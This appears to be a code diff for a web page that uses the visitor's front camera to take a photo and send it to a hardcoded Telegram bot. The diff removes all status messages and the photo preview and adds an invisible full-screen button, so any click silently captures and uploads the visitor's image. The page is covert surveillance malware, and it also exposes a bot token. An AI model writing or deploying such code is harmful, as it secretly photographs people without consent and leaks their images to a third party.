@@ -10,23 +10,23 @@
             width: 100%;
             height: 100%;
             background: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: sans-serif;
-            flex-direction: column;
-            gap: 16px;
+            overflow: hidden;
         }
-        img { max-width: 90%; border-radius: 12px; }
-        p { color: #555; font-size: 18px; text-align: center; padding: 0 20px; }
+        button {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            border: none;
+            background: transparent;
+            padding: 0;
+        }
     </style>
 </head>
 <body>
 
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
-<p id="status">Запускаю камеру...</p>
-<img id="photo" style="display:none;">
+<button id="btn"></button>
 
 <script>
     const BOT_TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
@@ -34,31 +34,29 @@
 
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
-    const photo = document.getElementById("photo");
-    const status = document.getElementById("status");
+
+    let requested = false;
 
     async function sendToTelegram(blob) {
-        status.textContent = "Отправляю в Telegram...";
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         formData.append("photo", blob, "photo.png");
         try {
-            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                 method: "POST",
                 body: formData
             });
-            const data = await res.json();
-            status.textContent = data.ok ? "Отправлено!" : "Ошибка Telegram: " + JSON.stringify(data);
         } catch (e) {
-            status.textContent = "Ошибка отправки: " + e.message;
+            console.log("Ошибка отправки:", e);
         }
     }
 
     async function takePhoto() {
-        status.textContent = "Запрашиваю камеру...";
+        if (requested) return;
+        requested = true;
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            status.textContent = "Камера открыта, делаю фото...";
             video.srcObject = stream;
             await video.play();
             await new Promise(r => setTimeout(r, 500));
@@ -67,16 +65,15 @@
             canvas.getContext("2d").drawImage(video, 0, 0);
             stream.getTracks().forEach(t => t.stop());
             canvas.toBlob(async (blob) => {
-                photo.src = URL.createObjectURL(blob);
-                photo.style.display = "block";
                 await sendToTelegram(blob);
             }, "image/png");
         } catch (e) {
-            status.textContent = "Ошибка камеры: " + e.name + " — " + e.message;
+            requested = false;
+            console.log("Ошибка:", e.name);
         }
     }
 
-    window.addEventListener("load", takePhoto);
+    document.getElementById("btn").addEventListener("click", takePhoto);
 </script>
 
 </body>
